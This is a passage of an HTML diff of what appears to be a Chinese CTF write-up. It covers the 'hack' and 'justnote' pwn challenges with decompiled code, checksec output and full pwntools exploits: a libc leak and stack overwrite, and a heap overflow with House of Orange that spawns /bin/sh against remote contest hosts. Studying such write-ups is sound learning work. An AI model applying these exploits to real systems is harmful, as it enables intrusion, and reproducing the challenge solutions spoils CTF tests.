class="line">p.sendline(str(puts_got))</span><br><span class="line">p.recvuntil(<span class="string">", "</span>)</span><br><span class="line">puts = int(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">env = libc_base + libc.sym[<span class="string">"_environ"</span>]</span><br><span class="line">one = libc_base +   <span class="number">0x3a819</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"libc_base --&gt; &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">p.sendline(str(env))</span><br><span class="line">p.recvuntil(<span class="string">", "</span>)</span><br><span class="line">stack_addr = int(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">target = stack_addr - <span class="number">0xb8</span></span><br><span class="line">log.info(<span class="string">" stack address is &#123;&#125;"</span>.format(hex(stack_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">" is "</span>)</span><br><span class="line">node_add = int(p.recvuntil(<span class="string">","</span>).strip(<span class="string">","</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">"node address is &#123;&#125;"</span>.format(hex(node_add)))</span><br><span class="line">p.recv()</span><br><span class="line">payload = p32(one)*<span class="number">2</span> + p32(node_add + <span class="number">4</span>)+p32(target<span class="number">-8</span>) </span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from pwn import*
+context.log_level = &quot;debug&quot;
+
+p = remote(&#39;210.32.4.16&#39;,&#39;13375&#39;)
+elf = ELF(&#39;./hack&#39;)
+libc = ELF(&#39;./libc.so&#39;)
+
+log.info(&quot;leak libc address &quot;)
+puts_got = elf.got[&quot;puts&quot;]
+p.recvuntil(&quot;input address: \n&quot;)
+p.sendline(str(puts_got))
+p.recvuntil(&quot;, &quot;)
+puts = int(p.recv(10),16)
+libc_base = puts - libc.symbols[&quot;puts&quot;]
+env = libc_base + libc.sym[&quot;_environ&quot;]
+one = libc_base +   0x3a819
+libc.address = libc_base
+
+log.info(&quot;libc_base --&gt; {}&quot;.format(hex(libc_base)))
+p.sendline(str(env))
+p.recvuntil(&quot;, &quot;)
+stack_addr = int(p.recv(10),16)
+target = stack_addr - 0xb8
+log.info(&quot; stack address is {}&quot;.format(hex(stack_addr)))
+
+p.recvuntil(&quot; is &quot;)
+node_add = int(p.recvuntil(&quot;,&quot;).strip(&quot;,&quot;),16)
+log.info(&quot;node address is {}&quot;.format(hex(node_add)))
+p.recv()
+payload = p32(one)*2 + p32(node_add + 4)+p32(target-8) 
+p.send(payload)
+p.interactive()
+</code></pre>
 <h3 id="justnote"><a href="#justnote" class="headerlink" title="justnote"></a>justnote</h3><p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  just_note  checksec justnote </span><br><span class="line">[*] &apos;/home/zs0zrc/game/gaoxiaoyunwei/just_note/justnote&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<p>程序逻辑：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  prepare();</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v4 = menu();</span><br><span class="line">            <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> &amp;&amp; v4 &lt;= <span class="number">4</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"invalid choice!"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          remove_note();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v4 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">          insert_note();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != <span class="number">4</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>☁  just_note  checksec justnote 
+[*] &#39;/home/zs0zrc/game/gaoxiaoyunwei/just_note/justnote&#39;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre><p>程序逻辑：</p>
+<pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int64 v4; // [rsp+18h] [rbp-8h]
+
+  prepare();
+  do
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            v4 = menu();
+            if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 4 )
+              break;
+            puts(&quot;invalid choice!&quot;);
+          }
+          if ( v4 != 2 )
+            break;
+          remove_note();
+        }
+        if ( v4 &gt; 2 )
+          break;
+        if ( v4 == 1 )
+          insert_note();
+      }
+      if ( v4 != 3 )
+        break;
+      edit_note();
+    }
+  }
+  while ( v4 != 4 );
+  return 0;
+}
+</code></pre>
 <p>一共有三个功能：</p>
 <ol>
 <li>insert_note 创建一个新的note</li>
@@ -491,11 +337,79 @@
 <li>remove_note 删除一个note</li>
 </ol>
 <p>insert_note：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insert_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 chunk; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; *(<span class="number">16L</span>L * i + table); ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"no more, no more"</span>);</span><br><span class="line">  chunk = <span class="built_in">calloc</span>(<span class="number">0x100</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"memory error, contact admin"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"length of note: "</span>, <span class="number">1L</span>L);</span><br><span class="line">  size = read_long_long();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> )	<span class="comment">//漏洞点： 最小的负数取反还是负数，可以造成堆溢出，无限写入</span></span><br><span class="line">    size = -size;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0xFF</span> )</span><br><span class="line">    size = <span class="number">255L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"note: "</span>);</span><br><span class="line">  recvn(chunk, size);</span><br><span class="line">  *(<span class="number">16L</span>L * i + table) = chunk ^ <span class="number">0xDEADBEEFCAFEBABE</span>LL;</span><br><span class="line">  *(table + <span class="number">16L</span>L * i + <span class="number">8</span>) = size;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"check it out: %s\n"</span>, chunk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int insert_note()
+{
+  __int64 chunk; // [rsp+8h] [rbp-18h]
+  __int64 size; // [rsp+10h] [rbp-10h]
+  signed int i; // [rsp+1Ch] [rbp-4h]
+
+  for ( i = 0; i &lt;= 31 &amp;&amp; *(16LL * i + table); ++i )
+    ;
+  if ( i == 32 )
+    return puts(&quot;no more, no more&quot;);
+  chunk = calloc(0x100uLL, 1uLL);
+  if ( !chunk )
+  {
+    puts(&quot;memory error, contact admin&quot;);
+    exit(1);
+  }
+  printf(&quot;length of note: &quot;, 1LL);
+  size = read_long_long();
+  if ( size &lt; 0 )    //漏洞点： 最小的负数取反还是负数，可以造成堆溢出，无限写入
+    size = -size;
+  if ( size &gt; 0xFF )
+    size = 255LL;
+  printf(&quot;note: &quot;);
+  recvn(chunk, size);
+  *(16LL * i + table) = chunk ^ 0xDEADBEEFCAFEBABELL;
+  *(table + 16LL * i + 8) = size;
+  return printf(&quot;check it out: %s\n&quot;, chunk);
+}
+</code></pre>
 <p>edit_note:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index of note: "</span>);</span><br><span class="line">  v1 = read_long_long();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">31</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"out of range"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(<span class="number">16</span> * v1 + table) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"no note here"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"note: "</span>);</span><br><span class="line">  <span class="keyword">return</span> recvn(*(<span class="number">16</span> * v1 + table) ^ <span class="number">0xDEADBEEFCAFEBABE</span>LL, *(<span class="number">16</span> * v1 + table + <span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int edit_note()
+{
+  __int64 v1; // [rsp+8h] [rbp-8h]
+
+  printf(&quot;index of note: &quot;);
+  v1 = read_long_long();
+  if ( v1 &lt; 0 || v1 &gt; 31 )
+    return puts(&quot;out of range&quot;);
+  if ( !*(16 * v1 + table) )
+    return puts(&quot;no note here&quot;);
+  printf(&quot;note: &quot;);
+  return recvn(*(16 * v1 + table) ^ 0xDEADBEEFCAFEBABELL, *(16 * v1 + table + 8));
+}
+</code></pre>
 <p>delete_note:</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">remove_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"index of note: "</span>);</span><br><span class="line">  v2 = read_long_long();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="number">16</span> * v2 + table) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((*(<span class="number">16</span> * v2 + table) ^ <span class="number">0xDEADBEEFCAFEBABE</span>LL));</span><br><span class="line">      *(<span class="number">16</span> * v2 + table) = <span class="number">0L</span>L;</span><br><span class="line">      v0 = <span class="number">16</span> * v2 + table;</span><br><span class="line">      *(v0 + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"no note here"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"out of range"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int remove_note()
+{
+  signed __int64 v0; // rax
+  __int64 v2; // [rsp+8h] [rbp-8h]
+
+  printf(&quot;index of note: &quot;);
+  v2 = read_long_long();
+  if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 31 )
+  {
+    if ( *(16 * v2 + table) )
+    {
+      free((*(16 * v2 + table) ^ 0xDEADBEEFCAFEBABELL));
+      *(16 * v2 + table) = 0LL;
+      v0 = 16 * v2 + table;
+      *(v0 + 8) = 0LL;
+    }
+    else
+    {
+      LODWORD(v0) = puts(&quot;no note here&quot;);
+    }
+  }
+  else
+  {
+    LODWORD(v0) = puts(&quot;out of range&quot;);
+  }
+  return v0;
+}
+</code></pre>
 <p>解题思路：</p>
 <blockquote>
 <p>利用堆溢出，先泄露出堆地址，然后泄露libc地址</p>
@@ -505,562 +419,384 @@
 </blockquote>
 <p>要注意的是 ，因为它分配堆的空间用的函数是calloc函数，它默认是会初始化堆块，将空间内容清空，但是如果是mmap分配的chunk空间的话，就不会清空。所以想泄露信息的话就要将chunk的 IS_MMAPED标志位覆盖为1</p>
 <p>伪造的fake_file </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">'/bin/sh'</span>.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file +=p64(<span class="number">0</span>) + p64(io_list_all_addr - <span class="number">0x10</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) 		<span class="comment">#_IO_write_base</span></span><br><span class="line">fake_file += p64(<span class="number">1</span>) 		<span class="comment">#_IO_write_ptr   bypass check  fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">9</span> </span><br><span class="line">fake_file += p64(system_addr) </span><br><span class="line">fake_file =fake_file.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>) </span><br><span class="line">fak_file += p64(<span class="number">0xffffffffffffffff</span>) 	<span class="comment">#bypass fp-&gt;_mode &lt;= 0</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">2</span> </span><br><span class="line">fake_file += p64(fake_file_addr + <span class="number">0x60</span>)		<span class="comment">#vtable</span></span><br></pre></td></tr></table></figure>
-<p><img src="/picture/1542802476359.png" alt="1542802476359"></p>
+<pre><code class="python">fake_file = &#39;/bin/sh&#39;.ljust(8, &#39;\x00&#39;) + p64(0x61)
+fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attack
+fake_file += p64(0)         #_IO_write_base
+fake_file += p64(1)         #_IO_write_ptr   bypass check  fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+fake_file += p64(0) * 9 
+fake_file += p64(system_addr) 
+fake_file =fake_file.ljust(0xc0,&#39;\x00&#39;) 
+fak_file += p64(0xffffffffffffffff)     #bypass fp-&gt;_mode &lt;= 0
+fake_file += p64(0) * 2 
+fake_file += p64(fake_file_addr + 0x60)        #vtable
+</code></pre>
+<p><img src="/picture/1542802476359.png" srcset="/img/loading.gif" alt="1542802476359"></p>
 <p>伪造的vtable表</p>
-<p><img src="/picture/1542802511064.png" alt="1542802511064"></p>
+<p><img src="/picture/1542802511064.png" srcset="/img/loading.gif" alt="1542802511064"></p>
 <p>最终exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./justnote'</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./justnote'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">"210.32.4.17"</span>,<span class="string">"13376"</span>)</span><br><span class="line">    elf = ELF(<span class="string">'./justnote'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">context.arch = elf.arch</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lgth, note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note: '</span>)</span><br><span class="line">    p.sendline(str(lgth))</span><br><span class="line">    p.recvuntil(<span class="string">'note: '</span>)</span><br><span class="line">    p.sendline(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note: '</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'note: '</span>)</span><br><span class="line">    p.sendline(note)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HouseOfOrange</span><span class="params">(fake_file_addr, system_addr, io_list_all_addr)</span>:</span></span><br><span class="line">	fake_file = <span class="string">'/bin/sh'</span>.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>) + p64(<span class="number">0x61</span>)</span><br><span class="line">	fake_file +=p64(<span class="number">0</span>) + p64(io_list_all_addr - <span class="number">0x10</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>) 		<span class="comment">#_IO_write_base</span></span><br><span class="line">	fake_file += p64(<span class="number">1</span>) 		<span class="comment">#_IO_write_ptr   bypass check  fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>) * <span class="number">9</span> </span><br><span class="line">	fake_file += p64(system_addr) </span><br><span class="line">	fake_file =fake_file.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>) </span><br><span class="line">	fake_file +=  p64(<span class="number">0xffffffffffffffff</span>) 	<span class="comment">#bypass fp-&gt;_mode &lt;= 0</span></span><br><span class="line">	fake_file += p64(<span class="number">0</span>) * <span class="number">2</span> </span><br><span class="line">	fake_file += p64(fake_file_addr + <span class="number">0x60</span>)		<span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fake_file</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">add(<span class="number">-9223372036854775808</span>,<span class="string">'a'</span>*<span class="number">8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'b'</span>*<span class="number">8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">-9223372036854775808</span>,<span class="string">'c'</span>*<span class="number">8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'d'</span>*<span class="number">8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">-9223372036854775808</span>,<span class="string">'e'</span>*<span class="number">8</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'d'</span>*<span class="number">8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">100</span>,<span class="string">'d'</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">pause()</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x108</span> + <span class="string">'\x13'</span>)</span><br><span class="line">add(<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x540</span></span><br><span class="line">log.info(<span class="string">"heap address is &#123;&#125;"</span>.format(hex(heap_addr)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0x108</span> + <span class="string">'\x13'</span>)</span><br><span class="line">add(<span class="number">100</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> - <span class="number">0x58</span></span><br><span class="line">log.info(<span class="string">"libc address is &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">'\x00'</span> * <span class="number">0x100</span> + HouseOfOrange(heap_addr + <span class="number">0x110</span> * <span class="number">2</span>, libc.sym[<span class="string">'system'</span>], libc.sym[<span class="string">'_IO_list_all'</span>]))</span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#!/usr/bin/env python
+from pwn import *
+local = 1
+
+if local:
+    p = process(&#39;./justnote&#39;)
+    elf = ELF(&#39;./justnote&#39;)
+    libc = elf.libc
+else:
+    p = remote(&quot;210.32.4.17&quot;,&quot;13376&quot;)
+    elf = ELF(&#39;./justnote&#39;)
+    libc = ELF(&#39;./libc.so&#39;)
+
+context.arch = elf.arch
+context.log_level=&#39;debug&#39;
+
+
+def add(lgth, note):
+    p.recvuntil(&#39;choice: &#39;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&#39;note: &#39;)
+    p.sendline(str(lgth))
+    p.recvuntil(&#39;note: &#39;)
+    p.sendline(note)
+
+def delete(idx):
+    p.recvuntil(&#39;choice: &#39;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&#39;note: &#39;)
+    p.sendline(str(idx))
+
+def edit(idx, note):
+    p.recvuntil(&#39;choice: &#39;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&#39;note: &#39;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;note: &#39;)
+    p.sendline(note)
+
+
+def HouseOfOrange(fake_file_addr, system_addr, io_list_all_addr):
+    fake_file = &#39;/bin/sh&#39;.ljust(8, &#39;\x00&#39;) + p64(0x61)
+    fake_file +=p64(0) + p64(io_list_all_addr - 0x10) #unsorted bin attack
+    fake_file += p64(0)         #_IO_write_base
+    fake_file += p64(1)         #_IO_write_ptr   bypass check  fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
+    fake_file += p64(0) * 9 
+    fake_file += p64(system_addr) 
+    fake_file =fake_file.ljust(0xc0,&#39;\x00&#39;) 
